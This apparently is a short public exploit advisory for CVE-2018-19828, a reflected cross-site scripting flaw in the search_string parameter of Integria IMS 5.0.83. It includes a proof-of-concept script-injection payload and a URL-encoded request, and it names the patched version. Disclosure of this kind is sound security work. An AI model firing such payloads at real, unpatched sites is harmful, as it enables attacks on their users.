@@ -1,0 +1,27 @@
+# Exploit Title: Integria IMS 5.0.83 - Cross-Site Scripting
+# Exploit Author: Javier Olmedo
+# Website: https://hackpuntes.com
+# Date: 2018-12-18
+# Google Dork: N/A
+# Vendor: Artica ST
+# Software Link: https://github.com/articaST/integriaims
+# Affected Version: 5.0.83 and possibly before
+# Patched Version: 5.0.84
+# Category: Web Application
+# Platform: Windows
+# Tested on: Win10x64 & Kali Linux
+# CVE: 2018-19828
+# References:
+# https://hackpuntes.com/cve-2018-19828-integria-ims-5-0-83-cross-site-scripting-reflejado/
+# https://github.com/articaST/integriaims/commit/25d810b1c8e138e4b47d5cd14b2cd9b564f19b1e
+
+# 1. Technical Description:
+# search_string parameter is vulnerable to Reflected Cross-Site Scripting (XSS) attacks
+# through a GET request in index.php resource.
+  
+# 2. Proof Of Concept (PoC):
+# On the main page, go to the search form and add the following payload 
+# '><script>alert('PoC CVE-2018-19828')</script>
+
+# 3. Payload
+# http://[PATH]/index.php?search_string=%27%3E%3Cscript%3Ealert(%27PoC%20CVE-2018-19828%27)%3C%2Fscript%3E
